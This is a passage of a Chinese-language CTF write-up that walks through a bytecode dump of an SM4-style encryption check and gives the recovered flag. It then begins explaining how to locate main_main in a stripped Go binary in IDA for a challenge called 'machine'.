CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">31</span></span><br><span class="line"> <span class="attribute">583</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">16</span></span><br><span class="line"> <span class="attribute">585</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">90</span></span><br><span class="line"> <span class="attribute">587</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">216</span></span><br><span class="line"> <span class="attribute">589</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">591</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">592</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">13</span></span><br><span class="line"> <span class="attribute">595</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">10</span></span><br><span class="line"> <span class="attribute">598</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">193</span></span><br><span class="line"> <span class="attribute">600</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">49</span></span><br><span class="line"> <span class="attribute">602</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">136</span></span><br><span class="line"> <span class="attribute">604</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">165</span></span><br><span class="line"> <span class="attribute">606</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">205</span></span><br><span class="line"> <span class="attribute">608</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">123</span></span><br><span class="line"> <span class="attribute">610</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">189</span></span><br><span class="line"> <span class="attribute">612</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">45</span></span><br><span class="line"> <span class="attribute">614</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">116</span></span><br><span class="line"> <span class="attribute">616</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">208</span></span><br><span class="line"> <span class="attribute">618</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">18</span></span><br><span class="line"> <span class="attribute">620</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">184</span></span><br><span class="line"> <span class="attribute">622</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">229</span></span><br><span class="line"> <span class="attribute">624</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">180</span></span><br><span class="line"> <span class="attribute">626</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">176</span></span><br><span class="line"> <span class="attribute">628</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">630</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">631</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">14</span></span><br><span class="line"> <span class="attribute">634</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">137</span></span><br><span class="line"> <span class="attribute">637</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">105</span></span><br><span class="line"> <span class="attribute">639</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">151</span></span><br><span class="line"> <span class="attribute">641</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">74</span></span><br><span class="line"> <span class="attribute">643</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">12</span></span><br><span class="line"> <span class="attribute">645</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">150</span></span><br><span class="line"> <span class="attribute">647</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">119</span></span><br><span class="line"> <span class="attribute">649</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">126</span></span><br><span class="line"> <span class="attribute">651</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">101</span></span><br><span class="line"> <span class="attribute">653</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">185</span></span><br><span class="line"> <span class="attribute">655</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">241</span></span><br><span class="line"> <span class="attribute">657</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">9</span></span><br><span class="line"> <span class="attribute">659</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">197</span></span><br><span class="line"> <span class="attribute">661</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">110</span></span><br><span class="line"> <span class="attribute">663</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">198</span></span><br><span class="line"> <span class="attribute">665</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">132</span></span><br><span class="line"> <span class="attribute">667</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">669</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">670</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">5</span>-&gt;string(SboxTable) number:<span class="number">15</span></span><br><span class="line"> <span class="attribute">673</span> : CBC_PUSH_LITERAL_PUSH_NUMBER_POS_BYTE ident:<span class="number">23</span>-&gt;string(Array) number:<span class="number">24</span></span><br><span class="line"> <span class="attribute">676</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">240</span></span><br><span class="line"> <span class="attribute">678</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">125</span></span><br><span class="line"> <span class="attribute">680</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">236</span></span><br><span class="line"> <span class="attribute">682</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">58</span></span><br><span class="line"> <span class="attribute">684</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">220</span></span><br><span class="line"> <span class="attribute">686</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">77</span></span><br><span class="line"> <span class="attribute">688</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">32</span></span><br><span class="line"> <span class="attribute">690</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">121</span></span><br><span class="line"> <span class="attribute">692</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">238</span></span><br><span class="line"> <span class="attribute">694</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">95</span></span><br><span class="line"> <span class="attribute">696</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">62</span></span><br><span class="line"> <span class="attribute">698</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">215</span></span><br><span class="line"> <span class="attribute">700</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">203</span></span><br><span class="line"> <span class="attribute">702</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">57</span></span><br><span class="line"> <span class="attribute">704</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">72</span></span><br><span class="line"> <span class="attribute">706</span> : CBC_NEW byte_arg:<span class="number">16</span></span><br><span class="line"> <span class="attribute">708</span> : CBC_ASSIGN_BLOCK</span><br><span class="line"> <span class="attribute">709</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">23</span>-&gt;string(Array) const:<span class="number">30</span>-&gt;number(<span class="number">462357</span>) const:<span class="number">31</span>-&gt;number(<span class="number">472066609</span>)</span><br><span class="line"> <span class="attribute">713</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">32</span>-&gt;number(<span class="number">943670861</span>) const:<span class="number">33</span>-&gt;number(<span class="number">1415275113</span>) const:<span class="number">34</span>-&gt;number(<span class="number">1886879365</span>)</span><br><span class="line"> <span class="attribute">717</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">35</span>-&gt;number(<span class="number">2358483617</span>) const:<span class="number">36</span>-&gt;number(<span class="number">2830087869</span>) const:<span class="number">37</span>-&gt;number(<span class="number">3301692121</span>)</span><br><span class="line"> <span class="attribute">721</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">38</span>-&gt;number(<span class="number">3773296373</span>) const:<span class="number">39</span>-&gt;number(<span class="number">4228057617</span>) const:<span class="number">40</span>-&gt;number(<span class="number">404694573</span>)</span><br><span class="line"> <span class="attribute">725</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">41</span>-&gt;number(<span class="number">876298825</span>) const:<span class="number">42</span>-&gt;number(<span class="number">1347903077</span>) const:<span class="number">43</span>-&gt;number(<span class="number">1819507329</span>)</span><br><span class="line"> <span class="attribute">729</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">44</span>-&gt;number(<span class="number">2291111581</span>) const:<span class="number">45</span>-&gt;number(<span class="number">2762715833</span>) const:<span class="number">46</span>-&gt;number(<span class="number">3234320085</span>)</span><br><span class="line"> <span class="attribute">733</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">47</span>-&gt;number(<span class="number">3705924337</span>) const:<span class="number">48</span>-&gt;number(<span class="number">4177462797</span>) const:<span class="number">49</span>-&gt;number(<span class="number">337322537</span>)</span><br><span class="line"> <span class="attribute">737</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">50</span>-&gt;number(<span class="number">808926789</span>) const:<span class="number">51</span>-&gt;number(<span class="number">1280531041</span>) const:<span class="number">52</span>-&gt;number(<span class="number">1752135293</span>)</span><br><span class="line"> <span class="attribute">741</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">53</span>-&gt;number(<span class="number">2223739545</span>) const:<span class="number">54</span>-&gt;number(<span class="number">2695343797</span>) const:<span class="number">55</span>-&gt;number(<span class="number">3166948049</span>)</span><br><span class="line"> <span class="attribute">745</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">56</span>-&gt;number(<span class="number">3638552301</span>) const:<span class="number">57</span>-&gt;number(<span class="number">4110090761</span>) const:<span class="number">58</span>-&gt;number(<span class="number">269950501</span>)</span><br><span class="line"> <span class="attribute">749</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">59</span>-&gt;number(<span class="number">741554753</span>) const:<span class="number">60</span>-&gt;number(<span class="number">1213159005</span>) const:<span class="number">61</span>-&gt;number(<span class="number">1684763257</span>)</span><br><span class="line"> <span class="attribute">753</span> : CBC_NEW byte_arg:<span class="number">32</span></span><br><span class="line"> <span class="attribute">755</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">6</span>-&gt;string(CK)</span><br><span class="line"> <span class="attribute">757</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">23</span>-&gt;string(Array) const:<span class="number">62</span>-&gt;number(<span class="number">2746333894</span>) const:<span class="number">63</span>-&gt;number(<span class="number">1453994832</span>)</span><br><span class="line"> <span class="attribute">761</span> : CBC_PUSH_TWO_LITERALS const:<span class="number">64</span>-&gt;number(<span class="number">1736282519</span>) const:<span class="number">65</span>-&gt;number(<span class="number">2993693404</span>)</span><br><span class="line"> <span class="attribute">764</span> : CBC_NEW byte_arg:<span class="number">4</span></span><br><span class="line"> <span class="attribute">766</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">7</span>-&gt;string(FK)</span><br><span class="line"> <span class="attribute">768</span> : CBC_PUSH_LITERAL const:<span class="number">66</span>-&gt;string(ctf&#123;this_is_an_example&#125;)</span><br><span class="line"> <span class="attribute">770</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">18</span>-&gt;string(input)</span><br><span class="line"> <span class="attribute">772</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">773</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">19</span>-&gt;string(num)</span><br><span class="line"> <span class="attribute">775</span> : CBC_PUSH_LITERAL ident:<span class="number">23</span>-&gt;string(Array)</span><br><span class="line"> <span class="attribute">777</span> : CBC_NEW0</span><br><span class="line"> <span class="attribute">778</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">20</span>-&gt;string(message)</span><br><span class="line"> <span class="attribute">780</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">781</span> : CBC_MOV_IDENT reg:<span class="number">1</span></span><br><span class="line"> <span class="attribute">783</span> : CBC_JUMP_FORWARD offset:<span class="number">32</span>(-&gt;<span class="number">815</span>)</span><br><span class="line"> <span class="attribute">785</span> : CBC_MULTIPLY_TWO_LITERALS ident:<span class="number">19</span>-&gt;string(num) const:<span class="number">67</span>-&gt;number(<span class="number">256</span>)</span><br><span class="line"> <span class="attribute">788</span> : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:<span class="number">18</span>-&gt;string(input) const:<span class="number">68</span>-&gt;string(charCodeAt)</span><br><span class="line"> <span class="attribute">791</span> : CBC_PUSH_LITERAL reg:<span class="number">1</span></span><br><span class="line"> <span class="attribute">793</span> : CBC_CALL1_PROP_PUSH_RESULT</span><br><span class="line"> <span class="attribute">794</span> : CBC_ADD</span><br><span class="line"> <span class="attribute">795</span> : CBC_ASSIGN_SET_IDENT_BLOCK ident:<span class="number">19</span>-&gt;string(num)</span><br><span class="line"> <span class="attribute">797</span> : CBC_MODULO_TWO_LITERALS reg:<span class="number">1</span> const:<span class="number">69</span>-&gt;number(<span class="number">4</span>)</span><br><span class="line"> <span class="attribute">800</span> : CBC_EQUAL_RIGHT_LITERAL const:<span class="number">70</span>-&gt;number(<span class="number">3</span>)</span><br><span class="line"> <span class="attribute">802</span> : CBC_BRANCH_IF_FALSE_FORWARD offset:<span class="number">11</span>(-&gt;<span class="number">813</span>)</span><br><span class="line"> <span class="attribute">804</span> : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:<span class="number">20</span>-&gt;string(message) const:<span class="number">71</span>-&gt;string(push)</span><br><span class="line"> <span class="attribute">807</span> : CBC_PUSH_LITERAL ident:<span class="number">19</span>-&gt;string(num)</span><br><span class="line"> <span class="attribute">809</span> : CBC_CALL1_PROP_BLOCK</span><br><span class="line"> <span class="attribute">810</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">811</span> : CBC_ASSIGN_SET_IDENT_BLOCK ident:<span class="number">19</span>-&gt;string(num)</span><br><span class="line"> <span class="attribute">813</span> : CBC_PRE_INCR_IDENT reg:<span class="number">1</span></span><br><span class="line"> <span class="attribute">815</span> : CBC_PUSH_TWO_LITERALS reg:<span class="number">1</span> ident:<span class="number">18</span>-&gt;string(input)</span><br><span class="line"> <span class="attribute">818</span> : CBC_PUSH_PROP_LITERAL const:<span class="number">72</span>-&gt;string(length)</span><br><span class="line"> <span class="attribute">820</span> : CBC_LESS</span><br><span class="line"> <span class="attribute">821</span> : CBC_BRANCH_IF_TRUE_BACKWARD offset:<span class="number">36</span>(-&gt;<span class="number">785</span>)</span><br><span class="line"> <span class="attribute">823</span> : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:<span class="number">24</span>-&gt;string(Math) const:<span class="number">73</span>-&gt;string(ceil)</span><br><span class="line"> <span class="attribute">826</span> : CBC_PUSH_PROP_LITERAL_LITERAL ident:<span class="number">20</span>-&gt;string(message) const:<span class="number">72</span>-&gt;string(length)</span><br><span class="line"> <span class="attribute">829</span> : CBC_DIVIDE_RIGHT_LITERAL const:<span class="number">69</span>-&gt;number(<span class="number">4</span>)</span><br><span class="line"> <span class="attribute">831</span> : CBC_CALL1_PROP_PUSH_RESULT</span><br><span class="line"> <span class="attribute">832</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">21</span>-&gt;string(count)</span><br><span class="line"> <span class="attribute">834</span> : CBC_MULTIPLY_TWO_LITERALS ident:<span class="number">21</span>-&gt;string(count) const:<span class="number">69</span>-&gt;number(<span class="number">4</span>)</span><br><span class="line"> <span class="attribute">837</span> : CBC_ASSIGN_SET_IDENT ident:<span class="number">22</span>-&gt;string(pad_len)</span><br><span class="line"> <span class="attribute">839</span> : CBC_JUMP_FORWARD offset:<span class="number">7</span>(-&gt;<span class="number">846</span>)</span><br><span class="line"> <span class="attribute">841</span> : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:<span class="number">20</span>-&gt;string(message) const:<span class="number">71</span>-&gt;string(push)</span><br><span class="line"> <span class="attribute">844</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">845</span> : CBC_CALL1_PROP_BLOCK</span><br><span class="line"> <span class="attribute">846</span> : CBC_PUSH_PROP_LITERAL_LITERAL ident:<span class="number">20</span>-&gt;string(message) const:<span class="number">72</span>-&gt;string(length)</span><br><span class="line"> <span class="attribute">849</span> : CBC_LESS_RIGHT_LITERAL ident:<span class="number">22</span>-&gt;string(pad_len)</span><br><span class="line"> <span class="attribute">851</span> : CBC_BRANCH_IF_TRUE_BACKWARD offset:<span class="number">10</span>(-&gt;<span class="number">841</span>)</span><br><span class="line"> <span class="attribute">853</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">23</span>-&gt;string(Array) const:<span class="number">74</span>-&gt;number(<span class="number">19088743</span>) const:<span class="number">75</span>-&gt;number(<span class="number">2309737967</span>)</span><br><span class="line"> <span class="attribute">857</span> : CBC_PUSH_TWO_LITERALS const:<span class="number">76</span>-&gt;number(<span class="number">4275878552</span>) const:<span class="number">77</span>-&gt;number(<span class="number">1985229328</span>)</span><br><span class="line"> <span class="attribute">860</span> : CBC_NEW byte_arg:<span class="number">4</span></span><br><span class="line"> <span class="attribute">862</span> : CBC_ASSIGN_SET_IDENT_BLOCK ident:<span class="number">25</span>-&gt;string(key)</span><br><span class="line"> <span class="attribute">864</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">23</span>-&gt;string(Array) const:<span class="number">78</span>-&gt;number(<span class="number">1605062385</span>) const:<span class="number">79</span>-&gt;number(-<span class="number">642825121</span>)</span><br><span class="line"> <span class="attribute">868</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">80</span>-&gt;number(<span class="number">2061445208</span>) const:<span class="number">81</span>-&gt;number(<span class="number">1405610911</span>) const:<span class="number">82</span>-&gt;number(<span class="number">1713399267</span>)</span><br><span class="line"> <span class="attribute">872</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">83</span>-&gt;number(<span class="number">1396669315</span>) const:<span class="number">84</span>-&gt;number(<span class="number">1081797168</span>) const:<span class="number">85</span>-&gt;number(<span class="number">605181189</span>)</span><br><span class="line"> <span class="attribute">876</span> : CBC_PUSH_THREE_LITERALS const:<span class="number">86</span>-&gt;number(<span class="number">1824766525</span>) const:<span class="number">87</span>-&gt;number(<span class="number">1196148725</span>) const:<span class="number">88</span>-&gt;number(<span class="number">763423307</span>)</span><br><span class="line"> <span class="attribute">880</span> : CBC_PUSH_LITERAL const:<span class="number">89</span>-&gt;number(<span class="number">1125925868</span>)</span><br><span class="line"> <span class="attribute">882</span> : CBC_NEW byte_arg:<span class="number">12</span></span><br><span class="line"> <span class="attribute">884</span> : CBC_ASSIGN_SET_IDENT_BLOCK ident:<span class="number">26</span>-&gt;string(ans)</span><br><span class="line"> <span class="attribute">886</span> : CBC_PUSH_LITERAL ident:<span class="number">23</span>-&gt;string(Array)</span><br><span class="line"> <span class="attribute">888</span> : CBC_NEW0</span><br><span class="line"> <span class="attribute">889</span> : CBC_ASSIGN_SET_IDENT_BLOCK ident:<span class="number">27</span>-&gt;string(message_c)</span><br><span class="line"> <span class="attribute">891</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">892</span> : CBC_MOV_IDENT reg:<span class="number">1</span></span><br><span class="line"> <span class="attribute">894</span> : CBC_JUMP_FORWARD offset:<span class="number">47</span>(-&gt;<span class="number">941</span>)</span><br><span class="line"> <span class="attribute">896</span> : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:<span class="number">20</span>-&gt;string(message) const:<span class="number">90</span>-&gt;str <span class="number">900</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">4</span></span><br><span class="line"> <span class="attribute">902</span> : CBC_CALL2_PROP_PUSH_RESULT</span><br><span class="line"> <span class="attribute">903</span> : CBC_MOV_IDENT reg:<span class="number">2</span></span><br><span class="line"> <span class="attribute">905</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">15</span>-&gt;string(encrypt) reg:<span class="number">2</span> ident:<span class="number">25</span>-&gt;string(key)</span><br><span class="line"> <span class="attribute">909</span> : CBC_CALL2_PUSH_RESULT</span><br><span class="line"> <span class="attribute">910</span> : CBC_MOV_IDENT reg:<span class="number">3</span></span><br><span class="line"> <span class="attribute">912</span> : CBC_PUSH_NUMBER_0</span><br><span class="line"> <span class="attribute">913</span> : CBC_MOV_IDENT reg:<span class="number">4</span></span><br><span class="line"> <span class="attribute">915</span> : CBC_JUMP_FORWARD offset:<span class="number">16</span>(-&gt;<span class="number">931</span>)</span><br><span class="line"> <span class="attribute">917</span> : CBC_PUSH_PROP_LITERAL_LITERAL_REFERENCE ident:<span class="number">27</span>-&gt;string(message_c) const:<span class="number">71</span>-&gt;string(push)</span><br><span class="line"> <span class="attribute">920</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">28</span>-&gt;string(parseInt) reg:<span class="number">3</span> reg:<span class="number">4</span></span><br><span class="line"> <span class="attribute">924</span> : CBC_PUSH_PROP</span><br><span class="line"> <span class="attribute">925</span> : CBC_PUSH_NUMBER_POS_BYTE number:<span class="number">16</span></span><br><span class="line"> <span class="attribute">927</span> : CBC_CALL2_PUSH_RESULT</span><br><span class="line"> <span class="attribute">928</span> : CBC_CALL1_PROP_BLOCK</span><br><span class="line"> <span class="attribute">929</span> : CBC_PRE_INCR_IDENT reg:<span class="number">4</span></span><br><span class="line"> <span class="attribute">931</span> : CBC_PUSH_TWO_LITERALS reg:<span class="number">4</span> reg:<span class="number">3</span></span><br><span class="line"> <span class="attribute">934</span> : CBC_PUSH_PROP_LITERAL const:<span class="number">72</span>-&gt;string(length)</span><br><span class="line"> <span class="attribute">936</span> : CBC_LESS</span><br><span class="line"> <span class="attribute">937</span> : CBC_BRANCH_IF_TRUE_BACKWARD offset:<span class="number">20</span>(-&gt;<span class="number">917</span>)</span><br><span class="line"> <span class="attribute">939</span> : CBC_PRE_INCR_IDENT reg:<span class="number">1</span></span><br><span class="line"> <span class="attribute">941</span> : CBC_LESS_TWO_LITERALS reg:<span class="number">1</span> ident:<span class="number">21</span>-&gt;string(count)</span><br><span class="line"> <span class="attribute">944</span> : CBC_BRANCH_IF_TRUE_BACKWARD offset:<span class="number">48</span>(-&gt;<span class="number">896</span>)</span><br><span class="line"> <span class="attribute">946</span> : CBC_PUSH_LITERAL ident:<span class="number">27</span>-&gt;string(message_c)</span><br><span class="line"> <span class="attribute">948</span> : CBC_BRANCH_IF_FALSE_FORWARD offset:<span class="number">10</span>(-&gt;<span class="number">958</span>)</span><br><span class="line"> <span class="attribute">950</span> : CBC_PUSH_THREE_LITERALS ident:<span class="number">29</span>-&gt;string(print) ident:<span class="number">17</span>-&gt;string(compare_array) ident:<span class="number">27</span>-&gt;string(message_c)</span><br><span class="line"> <span class="attribute">954</span> : CBC_PUSH_LITERAL ident:<span class="number">26</span>-&gt;string(ans)</span><br><span class="line"> <span class="attribute">956</span> : CBC_CALL2_PUSH_RESULT</span><br><span class="line"> <span class="attribute">957</span> : CBC_CALL1_BLOCK</span><br><span class="line"> <span class="attribute">958</span> : CBC_RETURN_FUNCTION_END</span><br></pre></td></tr></table></figure>

<p>找在线解密⽹址可以直接求解</p>
<p><img src="/2022/11/01/%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221101104654095.png" alt="image-20221101104654095"></p>
<p>后⾯不可⻅字符换成 }， 即为flag： ctf{w3_f0und_1t_112ug31vjhe121f21fas}</p>
<h3 id="machine"><a href="#machine" class="headerlink" title="machine"></a>machine</h3><p>​	隔了两周终于将这道题整明白了，完完整整的将这个题做了一遍，还是很折磨。首先，拉到ida里看是一个golang逆向，这个go逆向，在出题人编译的时候加上了-s -w，使得这个题去了符号，甚至还需要进行一定的操作才能看到正常的模样。</p>
<p>​	首先要知道去过符号的go是怎么逆向的，建议编写一个go不去符号的hello world，从start开始一直找到main_main函数，下面简单介绍一下这种go是如何找到main_main的。</p>
<p>第一步找到start函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line"><span class="type">void</span> __golang __noreturn <span class="title function_">start</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  start_0(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入start_0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __golang __noreturn <span class="title function_">start_0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">65432</span>]; <span class="comment">// [rsp+0h] [rbp-FFC0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+FF98h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+FFB0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// [rsp+FFB8h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+FFC0h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v14 = retaddr;</span><br><span class="line">  v15 = &amp;a1;</span><br><span class="line">  qword_5A5860[<span class="number">2</span>] = v12;</span><br><span class="line">  qword_5A5860[<span class="number">3</span>] = v12;</span><br><span class="line">  qword_5A5860[<span class="number">0</span>] = v12;</span><br><span class="line">  qword_5A5860[<span class="number">1</span>] = &amp;v13;</span><br><span class="line">  _RAX = <span class="number">0LL</span>;</span><br><span class="line">  __asm &#123; cpuid &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)_RAX )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)_RBX == <span class="number">1970169159</span> &amp;&amp; (_DWORD)_RDX == <span class="number">1231384169</span> &amp;&amp; (_DWORD)_RCX == <span class="number">1818588270</span> )</span><br><span class="line">      byte_5F9C6B = <span class="number">1</span>;</span><br><span class="line">    _RAX = <span class="number">1LL</span>;</span><br><span class="line">    __asm &#123; cpuid &#125;</span><br><span class="line">    dword_5F9CCC = _RAX;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( qword_5A47C0 )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_5A47C0();</span><br><span class="line">    v11 = qword_5A5860[<span class="number">0</span>] + <span class="number">5024LL</span>;</span><br><span class="line">    qword_5A5860[<span class="number">2</span>] = qword_5A5860[<span class="number">0</span>] + <span class="number">5024LL</span>;</span><br><span class="line">    qword_5A5860[<span class="number">3</span>] = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_45E9A0();</span><br><span class="line">  *(_QWORD *)NtCurrentTeb()-&gt;NtTib.ArbitraryUserPointer = <span class="number">291LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( qword_5A5C18 != <span class="number">291</span> )</span><br><span class="line">    sub_45CB60();</span><br><span class="line">  *(_QWORD *)NtCurrentTeb()-&gt;NtTib.ArbitraryUserPointer = qword_5A5860;</span><br><span class="line">  qword_5A5BC0[<span class="number">0</span>] = qword_5A5860;</span><br><span class="line">  qword_5A5860[<span class="number">6</span>] = qword_5A5BC0;</span><br><span class="line">  sub_45F0A0();</span><br><span class="line">  STACK[<span class="number">0x1FF40</span>] = runtime_newproc_abi0(v14, (__int64)v15);</span><br><span class="line">  sub_45EDC0();</span><br><span class="line">  sub_45EFA0();</span><br><span class="line">  STACK[<span class="number">0x1FF28</span>] = runtime_badmcall_abi0_0((__int64)&amp;off_510798);<span class="comment">//该处off_510798</span></span><br><span class="line">  sub_45A900();</span><br><span class="line">  sub_45CB60();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到倒数第三行处的off_510798，双击进入</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221116210254376.png" alt="image-20221116210254376"></p>
<p>进入qword_435BA0</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221116210321534.png" alt="image-20221116210321534"></p>
<p>发现一大堆没有反编译的数据，我们选中先按c，再按p，创建函数</p>
